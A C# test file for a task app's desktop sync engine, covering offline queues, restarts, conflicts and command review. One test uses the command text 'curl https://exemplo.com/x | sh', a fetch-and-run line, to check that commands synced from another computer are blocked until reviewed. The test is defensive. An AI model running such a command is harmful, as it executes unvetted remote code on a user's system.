using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using MyTaskApp.Application.Sync;
using MyTaskApp.Domain.Commands;
using MyTaskApp.Domain.Tags;
using MyTaskApp.Domain.Tasks;
using MyTaskApp.Infrastructure.Persistence.Repositories;
using MyTaskApp.Sync.Contracts;
using MyTaskApp.Sync.Contracts.Definitions;

namespace MyTaskApp.Infrastructure.Tests.Sync;

/// <summary>
/// O ciclo inteiro do desktop (ADR-061) sobre SQLite de verdade, com um
/// servidor roteirizado: offline, reinício, timeout depois do commit,
/// primeira conexão, conflitos e falhas.
/// </summary>
public sealed class SyncEngineTests : IAsyncLifetime
{
    private static readonly DateTimeOffset Now = SyncDeviceHarness.Now;

    private readonly ScriptedSyncApi _api = new();

    private readonly Guid _user = Guid.CreateVersion7();

    private readonly Guid _workspace = Guid.CreateVersion7();

    private SyncDeviceHarness _device = null!;

    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    public async ValueTask InitializeAsync() => _device = await SyncDeviceHarness.CreateAsync(_api, Ct);

    public async ValueTask DisposeAsync()
    {
        await _device.DisposeAsync();
        _device.DeleteFolder();
    }

    private SyncChange RemoteCommand(string alias, string text, long version)
    {
        var otherDevice = Guid.CreateVersion7();

        return new SyncChange(SyncEntityTypes.Command, Guid.CreateVersion7(), version, false, new Dictionary<string, JsonElement>
        {
            [SyncFields.Command.TagDirectoryId] = SyncValue.Null,
            [SyncFields.Command.Alias] = SyncValue.String(alias),
            [SyncFields.Command.Text] = SyncValue.String(text),
            [SyncFields.Command.Mode] = SyncValue.Integer(0),
            [SyncFields.Command.KeepTerminalOpen] = SyncValue.Boolean(true),
            [SyncFields.Command.RequiresConfirmation] = SyncValue.Boolean(false),
            [SyncFields.Command.Parameters] = SyncValue.List([]),
            [SyncFields.CreatedAt] = SyncValue.Instant(Now),
            [SyncFields.UpdatedAt] = SyncValue.Instant(Now),
        }, _user, otherDevice, Now, otherDevice, Now);
    }

    [Fact]
    public async Task WithoutAnAccount_NothingHappens_AndTheAppIsJustLocal()
    {
        await _device.SaveAsync(context => context.Add(TaskItem.Create("Pagar boleto", Now)), Ct);

        var result = await _device.Engine.RunCycleAsync(Ct);

        result.Status.Should().Be(SyncCycleStatus.Idle);
        _api.Calls.Should().BeEmpty();
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(0);
        (await _device.ReadAsync(context => context.Tasks.CountAsync(Ct))).Should().Be(1);
    }

    [Fact]
    public async Task Offline_TheOutboxWaits_AndTheErrorIsShown()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        await _device.SaveAsync(context => context.Add(TaskItem.Create("Pagar boleto", Now)), Ct);
        _api.FailHello = new SyncApiException(SyncFailureKind.Transient, "Sem conexão com o servidor de sincronização.");

        var result = await _device.Engine.RunCycleAsync(Ct);

        result.Status.Should().Be(SyncCycleStatus.Transient);
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(2);
        var state = await _device.StoreAsync(store => store.ReadAsync(Ct));
        state.State.Should().Be(SyncLinkState.Linked);
        state.LastError.Should().Contain("Sem conexão");
    }

    /// <summary>
    /// Trocar de conta esquece o que era da anterior e grava a nova ligação
    /// juntos: uma queda no meio não pode deixar o outbox apagado com a
    /// ligação antiga ainda de pé.
    /// </summary>
    [Fact]
    public async Task LinkingToAnotherAccount_IsAllOrNothing()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        await _device.SaveAsync(context => context.Add(TaskItem.Create("Pagar boleto", Now)), Ct);
        var pending = await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct));
        pending.Should().BePositive();

        var link = () => _device.RunAsync(async provider =>
        {
            provider.GetRequiredService<MyTaskApp.Infrastructure.Persistence.MyTaskAppDbContext>().SavingChanges +=
                (_, _) => throw new InvalidOperationException("O app caiu antes de gravar a ligação.");

            await provider.GetRequiredService<ISyncLocalStore>().LinkAsync(
                new SyncAccountLink(Guid.CreateVersion7(), "Bia", "bia@exemplo.com", Guid.CreateVersion7(), _device.Device.DeviceId, new Uri("https://sync.exemplo.com/")),
                Ct);
        });

        await link.Should().ThrowAsync<InvalidOperationException>();

        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(pending);
        (await _device.ReadAsync(context => context.SyncState.SingleAsync(Ct))).UserId.Should().Be(_user);
    }

    [Fact]
    public async Task AfterARestart_TheSameOperationsAreResent_AndTheServerRecognizesThem()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        await _device.SaveAsync(context => context.Add(TaskItem.Create("Pagar boleto", Now)), Ct);

        // O servidor gravou, e a resposta se perdeu.
        _api.LoseTheNextPushResponse = true;
        (await _device.Engine.RunCycleAsync(Ct)).Status.Should().Be(SyncCycleStatus.Transient);
        var firstAttempt = _api.Pushed.Select(operation => operation.OpId).ToList();
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(row => row.Attempted, Ct))).Should().Be(2);

        // O app fecha e abre de novo sobre o mesmo banco.
        await _device.DisposeAsync();
        _device = await SyncDeviceHarness.CreateAsync(_api, Ct, _device.Folder, _device.Device);

        (await _device.Engine.RunCycleAsync(Ct)).Status.Should().Be(SyncCycleStatus.Completed);

        _api.Pushed.Skip(firstAttempt.Count).Select(operation => operation.OpId).Should().Equal(firstAttempt, "os mesmos ids, para o servidor reconhecer");
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(0);
        (await _device.ReadAsync(context => context.SyncEntityStates.Select(state => state.ServerVersion).ToListAsync(Ct)))
            .Should().OnlyContain(version => version == 1);
    }

    [Fact]
    public async Task TheFirstConnection_PullsFirst_AndSendsOnlyWhatExistsOnlyHere()
    {
        var mine = TaskItem.Create("Só daqui", Now);
        await _device.SaveAsync(context => context.Add(mine), Ct);
        var remoteTag = Guid.CreateVersion7();
        _api.Pages.Enqueue(new PullResponse(
            [
                new SyncChange(SyncEntityTypes.Tag, remoteTag, 3, false, new Dictionary<string, JsonElement>
                {
                    [SyncFields.Tag.Name] = SyncValue.String("Do servidor"),
                    [SyncFields.Tag.ColorHex] = SyncValue.String("#123456"),
                    [SyncFields.CreatedAt] = SyncValue.Instant(Now),
                }, _user, Guid.CreateVersion7(), Now, Guid.CreateVersion7(), Now),
            ],
            SyncCursor.Encode(3),
            false));

        await _device.LinkAsync(_user, _workspace, Ct, joined: false);
        (await _device.Engine.RunCycleAsync(Ct)).Status.Should().Be(SyncCycleStatus.Completed);

        _api.Calls.Should().StartWith(["hello", "pull", "push"]);
        _api.Pushed.Select(operation => operation.EntityId).Should().BeEquivalentTo([mine.Id, mine.Occurrences.Single().Id]);
        _api.Pushed.Should().NotContain(operation => operation.EntityId == remoteTag);
        (await _device.ReadAsync(context => context.Tags.SingleAsync(Ct))).Name.Should().Be("Do servidor");
        (await _device.StoreAsync(store => store.ReadAsync(Ct))).ClientSchemaVersion.Should().Be(SyncSchema.Current);
    }

    [Fact]
    public async Task AConcurrentChange_TakesTheServerValue_AndLeavesAVisibleConflict_ThatCanBeReapplied()
    {
        var task = await LinkedTaskAsync();
        await RenameAsync(task.Id, "Título deste computador");
        _api.Respond = operation => new OperationResult(
            operation.OpId,
            OperationOutcome.Rejected,
            false,
            2,
            2,
            [new RejectedField(SyncFields.Task.Title, SyncErrorCodes.ConcurrentChange, SyncValue.String("Título do outro"))]);

        await _device.Engine.RunCycleAsync(Ct);

        (await _device.ReadAsync(context => context.Tasks.SingleAsync(Ct))).Title.Should().Be("Título do outro");
        var conflict = (await _device.StoreAsync(store => store.ListConflictsAsync(Ct))).Should().ContainSingle().Subject;
        conflict.LocalValue.Should().Contain("Título deste computador");
        conflict.EntityLabel.Should().Be("Título do outro");
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(0);

        await _device.RunAsync(provider => provider.GetRequiredService<ResolveSyncConflictHandler>()
            .HandleAsync(new ResolveSyncConflict(conflict.Id, Reapply: true), Ct));

        (await _device.ReadAsync(context => context.Tasks.SingleAsync(Ct))).Title.Should().Be("Título deste computador");
        var again = await _device.ReadAsync(context => context.SyncOutbox.SingleAsync(Ct));
        again.BaseVersion.Should().Be(1);
        SyncSnapshotFields(again.Fields).Keys.Should().Equal(SyncFields.Task.Title);
        (await _device.StoreAsync(store => store.ListConflictsAsync(Ct))).Should().BeEmpty();
    }

    [Fact]
    public async Task AStampResolvedSilently_TakesTheServerValue_WithoutAConflict()
    {
        var task = await LinkedTaskAsync();
        await EditAsync(task.Id, loaded => loaded.Archive(Now.AddHours(1)));
        _api.Respond = operation => new OperationResult(
            operation.OpId, OperationOutcome.Noop, false, 2, 2,
            [new RejectedField(SyncFields.Task.ArchivedAt, SyncErrorCodes.Superseded, SyncValue.Instant(Now.AddMinutes(5)))]);

        await _device.Engine.RunCycleAsync(Ct);

        (await _device.ReadAsync(context => context.Tasks.SingleAsync(Ct))).ArchivedAt.Should().Be(Now.AddMinutes(5));
        (await _device.StoreAsync(store => store.ListConflictsAsync(Ct))).Should().BeEmpty();
    }

    [Fact]
    public async Task EditingSomethingDeletedElsewhere_DeletesItHereToo_AndKeepsTheEdit()
    {
        var task = await LinkedTaskAsync();
        await RenameAsync(task.Id, "Editada offline");
        _api.Respond = operation => new OperationResult(operation.OpId, OperationOutcome.Rejected, false, 3, 3, [], new SyncError(SyncErrorCodes.EntityDeleted, "Excluída."));

        await _device.Engine.RunCycleAsync(Ct);

        (await _device.ReadAsync(context => context.Tasks.CountAsync(Ct))).Should().Be(0);
        (await _device.StoreAsync(store => store.ListConflictsAsync(Ct))).Should().ContainSingle()
            .Which.Reason.Should().Be(SyncErrorCodes.EntityDeleted);
    }

    [Fact]
    public async Task APermanentRefusal_BlocksOnlyThatEntity_UntilRetriedWithANewId()
    {
        var task = await LinkedTaskAsync();
        var other = TaskItem.Create("Outra", Now);
        await _device.SaveAsync(context => context.Add(other), Ct);
        await RenameAsync(task.Id, "Recusada");
        _api.Respond = operation => operation.EntityId == task.Id
            ? new OperationResult(operation.OpId, OperationOutcome.Rejected, false, 1, 1, [], new SyncError(SyncErrorCodes.ValidationFailed, "title: inválido"))
            : ScriptedSyncApi.Applied(operation);

        await _device.Engine.RunCycleAsync(Ct);

        var failed = (await _device.StoreAsync(store => store.ListFailedAsync(Ct))).Should().ContainSingle().Subject;
        failed.ErrorCode.Should().Be(SyncErrorCodes.ValidationFailed);
        (await _device.StoreAsync(store => store.CountAsync(_device.Device.DeviceId, Ct))).Failed.Should().Be(1);

        await RenameAsync(task.Id, "Recusada de novo");
        var before = _api.Pushed.Count;
        await _device.Engine.RunCycleAsync(Ct);
        _api.Pushed.Skip(before).Should().NotContain(operation => operation.EntityId == task.Id, "a entidade espera alguém decidir");

        _api.Respond = ScriptedSyncApi.Applied;
        await _device.StoreAsync(store => store.RetryFailedAsync(failed.OpId, Ct));
        await _device.Engine.RunCycleAsync(Ct);

        _api.Pushed.Should().Contain(operation => operation.EntityId == task.Id && operation.OpId != failed.OpId);
        (await _device.StoreAsync(store => store.ListFailedAsync(Ct))).Should().BeEmpty();
    }

    /// <summary>
    /// SEC-017: o servidor foi restaurado de um backup e a versão daqui ficou à
    /// frente da dele. A recusa traz a versão que vale, e o reenvio sai com ela.
    /// </summary>
    [Fact]
    public async Task ABaseVersionAheadOfARestoredServer_LowersTheKnownVersion_AndRetryGoesThrough()
    {
        var task = await LinkedTaskAsync();
        await RenameAsync(task.Id, "Antes do backup");
        _api.Respond = operation => new OperationResult(operation.OpId, OperationOutcome.Applied, false, 5, operation.BaseVersion, []);
        await _device.Engine.RunCycleAsync(Ct);
        (await ServerVersionAsync(task.Id)).Should().Be(5);

        await RenameAsync(task.Id, "Depois do backup");
        _api.Respond = operation => new OperationResult(
            operation.OpId, OperationOutcome.Rejected, false, 2, 2, [], new SyncError(SyncErrorCodes.InvalidBaseVersion, "Versão base 5 inválida; a do servidor é 2."));
        await _device.Engine.RunCycleAsync(Ct);

        var failed = (await _device.StoreAsync(store => store.ListFailedAsync(Ct))).Should().ContainSingle().Subject;
        failed.ErrorCode.Should().Be(SyncErrorCodes.InvalidBaseVersion);
        (await ServerVersionAsync(task.Id)).Should().Be(2);
        await RenameAsync(task.Id, "Na fila atrás da falha");

        _api.Respond = ScriptedSyncApi.Applied;
        var before = _api.Pushed.Count;
        await _device.StoreAsync(store => store.RetryFailedAsync(failed.OpId, Ct));
        await _device.Engine.RunCycleAsync(Ct);

        _api.Pushed.Skip(before).Where(operation => operation.EntityId == task.Id)
            .Should().HaveCount(2).And.OnlyContain(operation => operation.BaseVersion == 2);
        (await _device.StoreAsync(store => store.ListFailedAsync(Ct))).Should().BeEmpty();
        (await ServerVersionAsync(task.Id)).Should().Be(3);
    }

    [Fact]
    public async Task AMissingParent_WaitsForTheNextCycle_WithoutSpinning()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        await _device.SaveAsync(context => context.Add(TaskItem.Create("Pagar boleto", Now)), Ct);
        _api.Respond = operation => new OperationResult(operation.OpId, OperationOutcome.Rejected, false, 0, 0, [], new SyncError(SyncErrorCodes.ParentMissing, "O pai ainda não chegou."));

        (await _device.Engine.RunCycleAsync(Ct)).Status.Should().Be(SyncCycleStatus.Completed);

        _api.Calls.Count(call => call == "push").Should().Be(1);
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(2);
    }

    [Fact]
    public async Task AnExpiredLogin_StopsAndAsksToReconnect()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        _api.FailHello = new SyncApiException(SyncFailureKind.NeedsReconnect, "Conecte de novo.");

        var result = await _device.Engine.RunCycleAsync(Ct);

        result.Status.Should().Be(SyncCycleStatus.Blocked);
        (await _device.StoreAsync(store => store.ReadAsync(Ct))).State.Should().Be(SyncLinkState.NeedsReconnect);
    }

    [Fact]
    public async Task ADatabaseCopiedFromAnotherComputer_DoesNotSpeakForIt()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        _device.Device.Rotate();

        var result = await _device.Engine.RunCycleAsync(Ct);

        result.Status.Should().Be(SyncCycleStatus.Blocked);
        _api.Calls.Should().BeEmpty();
        (await _device.StoreAsync(store => store.ReadAsync(Ct))).State.Should().Be(SyncLinkState.NeedsReconnect);
    }

    [Fact]
    public async Task SwitchedOff_ItKeepsCapturing_ButNothingTravels()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        await _device.StoreAsync(store => store.SetEnabledAsync(false, Ct));
        await _device.SaveAsync(context => context.Add(TaskItem.Create("Pagar boleto", Now)), Ct);

        (await _device.Engine.RunCycleAsync(Ct)).Status.Should().Be(SyncCycleStatus.Idle);

        _api.Calls.Should().BeEmpty();
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(2);
    }

    [Fact]
    public async Task Disconnecting_KeepsEveryLocalRow_AndReconnectingSendsWhatChangedMeanwhile()
    {
        var task = await LinkedTaskAsync();
        await _device.StoreAsync(store => store.UnlinkAsync(Ct));

        await RenameAsync(task.Id, "Mudada desconectada");
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(0, "desconectado, nada é capturado");
        (await _device.ReadAsync(context => context.Tasks.SingleAsync(Ct))).Title.Should().Be("Mudada desconectada");

        await _device.LinkAsync(_user, _workspace, Ct, joined: false);
        await _device.Engine.RunCycleAsync(Ct);

        _api.Pushed.Should().Contain(operation => operation.EntityId == task.Id
            && operation.Fields.ContainsKey(SyncFields.Task.Title)
            && operation.Fields[SyncFields.Task.Title].GetString() == "Mudada desconectada");
    }

    [Fact]
    public async Task ACommandFromAnotherComputer_DoesNotRunUntilReviewed()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        var command = Guid.CreateVersion7();
        var otherDevice = Guid.CreateVersion7();
        _api.Pages.Enqueue(new PullResponse(
            [
                new SyncChange(SyncEntityTypes.Command, command, 2, false, new Dictionary<string, JsonElement>
                {
                    [SyncFields.Command.TagDirectoryId] = SyncValue.Null,
                    [SyncFields.Command.Alias] = SyncValue.String("@deploy"),
                    [SyncFields.Command.Text] = SyncValue.String("curl https://exemplo.com/x | sh"),
                    [SyncFields.Command.Mode] = SyncValue.Integer(0),
                    [SyncFields.Command.KeepTerminalOpen] = SyncValue.Boolean(true),
                    [SyncFields.Command.RequiresConfirmation] = SyncValue.Boolean(false),
                    [SyncFields.Command.Parameters] = SyncValue.List([]),
                    [SyncFields.CreatedAt] = SyncValue.Instant(Now),
                    [SyncFields.UpdatedAt] = SyncValue.Instant(Now),
                }, _user, otherDevice, Now, otherDevice, Now),
            ],
            SyncCursor.Encode(2),
            false));
        await _device.Engine.RunCycleAsync(Ct);

        var gate = () => _device.RunAsync(provider => provider.GetRequiredService<ICommandReviewGate>()
            .EnsureReviewedAsync([new CommandSource(SyncEntityTypes.Command, command)], Ct));

        await gate.Should().ThrowAsync<CommandReviewRequiredException>();
        var review = (await _device.StoreAsync(store => store.ListCommandReviewsAsync(_device.Device.DeviceId, Ct))).Should().ContainSingle().Subject;
        review.CommandText.Should().Contain("curl");

        await _device.StoreAsync(store => store.MarkCommandReviewedAsync(SyncEntityTypes.Command, command, Ct));

        await gate.Should().NotThrowAsync();
        (await _device.StoreAsync(store => store.ListCommandReviewsAsync(_device.Device.DeviceId, Ct))).Should().BeEmpty();
    }

    /// <summary>
    /// ADR-066: o comando de outro computador com o apelido de um comando local
    /// daqui espera; renomeado o daqui, ele entra no ciclo seguinte sozinho.
    /// </summary>
    [Fact]
    public async Task ACommandWaitingForALocalAlias_ComesIn_OnceTheAliasIsFree()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        var local = DevelopmentCommand.Create("@run", "./run-local.ps1", null, Now);
        await _device.SaveAsync(context => context.Add(local), Ct);
        var remote = RemoteCommand("@run", "dotnet run", version: 2);
        _api.Pages.Enqueue(new PullResponse([remote], SyncCursor.Encode(2), false));
        _api.Fetchable.Add(remote);

        await _device.Engine.RunCycleAsync(Ct);

        (await _device.ReadAsync(context => context.DevelopmentCommands.SingleAsync(Ct))).Id.Should().Be(local.Id);
        _api.Pushed.Should().BeEmpty("o comando local não sai daqui");
        var counts = await _device.StoreAsync(store => store.CountAsync(_device.Device.DeviceId, Ct));
        counts.ApplyFailures.Should().Be(1);

        await _device.SaveAsync(context =>
        {
            var loaded = context.DevelopmentCommands.Include(command => command.Parameters).Single();
            loaded.Update("@run-local", loaded.Command, null, Now);
        }, Ct);
        _api.Calls.Clear();
        await _device.Engine.RunCycleAsync(Ct);

        _api.Calls.Should().Contain("fetch");
        (await _device.ReadAsync(context => context.DevelopmentCommands.Select(command => command.Alias).ToListAsync(Ct)))
            .Should().BeEquivalentTo(["@run", "@run-local"]);
        (await _device.StoreAsync(store => store.CountAsync(_device.Device.DeviceId, Ct))).ApplyFailures.Should().Be(0);

        _api.Calls.Clear();
        await _device.Engine.RunCycleAsync(Ct);
        _api.Calls.Should().NotContain("fetch", "nada mais espera");
    }

    [Fact]
    public async Task ACommandWrittenHere_NeedsNoReview()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        var command = DevelopmentCommand.Create("@build", "dotnet build", null, Now);
        await _device.SaveAsync(context => context.Add(command), Ct);

        var gate = () => _device.RunAsync(provider => provider.GetRequiredService<ICommandReviewGate>()
            .EnsureReviewedAsync([new CommandSource(SyncEntityTypes.Command, command.Id)], Ct));

        await gate.Should().NotThrowAsync();
    }

    [Fact]
    public async Task ATagCreatedOnBothSides_IsMergedWhenTheServerRefusesTheDuplicate()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        var local = Tag.Create("Casa", "#111111", Now);
        var task = TaskItem.Create("Varrer", Now);
        task.SetTags([local.Id]);
        await _device.SaveAsync(context => context.AddRange(local, task), Ct);

        // A do servidor chega primeiro pelo pull; a local, ainda pendente, sai do caminho.
        var remote = Guid.CreateVersion7();
        _api.Respond = operation => operation.EntityId == local.Id
            ? new OperationResult(operation.OpId, OperationOutcome.Rejected, false, 0, 0,
                [new RejectedField(SyncFields.Tag.Name, SyncErrorCodes.UniqueViolation, SyncValue.Null, remote)],
                new SyncError(SyncErrorCodes.UniqueViolation, "Já existe."))
            : operation.EntityType == SyncEntityTypes.TaskTag
                ? new OperationResult(operation.OpId, OperationOutcome.Rejected, false, 0, 0, [], new SyncError(SyncErrorCodes.ParentMissing, "Falta o pai."))
                : ScriptedSyncApi.Applied(operation);
        _api.Pages.Enqueue(new PullResponse(
            [
                new SyncChange(SyncEntityTypes.Tag, remote, 1, false, new Dictionary<string, JsonElement>
                {
                    [SyncFields.Tag.Name] = SyncValue.String("Casa"),
                    [SyncFields.Tag.ColorHex] = SyncValue.String("#00FF00"),
                    [SyncFields.CreatedAt] = SyncValue.Instant(Now),
                }, _user, Guid.CreateVersion7(), Now, Guid.CreateVersion7(), Now),
            ],
            SyncCursor.Encode(1),
            false));

        await _device.Engine.RunCycleAsync(Ct);
        _api.Respond = ScriptedSyncApi.Applied;
        await _device.Engine.RunCycleAsync(Ct);

        var tags = await _device.ReadAsync(context => context.Tags.ToListAsync(Ct));
        tags.Should().ContainSingle().Which.Id.Should().Be(remote);
        (await _device.ReadAsync(context => context.TaskItemTags.SingleAsync(Ct))).TagId.Should().Be(remote);
        _api.Pushed.Should().Contain(operation => operation.EntityType == SyncEntityTypes.TaskTag
            && operation.EntityId == SyncIds.TaskTag(task.Id, remote));
        (await _device.ReadAsync(context => context.SyncOutbox.CountAsync(Ct))).Should().Be(0);
    }

    private async Task<TaskItem> LinkedTaskAsync()
    {
        await _device.LinkAsync(_user, _workspace, Ct);
        var task = TaskItem.Create("Pagar boleto", Now);
        await _device.SaveAsync(context => context.Add(task), Ct);
        await _device.Engine.RunCycleAsync(Ct);
        return task;
    }

    private Task RenameAsync(Guid taskId, string title) => EditAsync(taskId, task => task.Rename(title));

    private Task<long> ServerVersionAsync(Guid taskId) =>
        _device.ReadAsync(context => context.SyncEntityStates
            .Where(state => state.EntityType == SyncEntityTypes.Task && state.EntityId == taskId)
            .Select(state => state.ServerVersion)
            .SingleAsync(Ct));

    private Task EditAsync(Guid taskId, Action<TaskItem> change) =>
        _device.RunAsync(async provider =>
        {
            var context = provider.GetRequiredService<global::MyTaskApp.Infrastructure.Persistence.MyTaskAppDbContext>();
            var task = await new TaskItemRepository(context).FindByIdAsync(taskId, Ct);
            change(task!);
            await context.SaveChangesAsync(Ct);
        });

    private static Dictionary<string, JsonElement> SyncSnapshotFields(string json) =>
        global::MyTaskApp.Infrastructure.Sync.Capture.SyncSnapshot.Read(json);
}
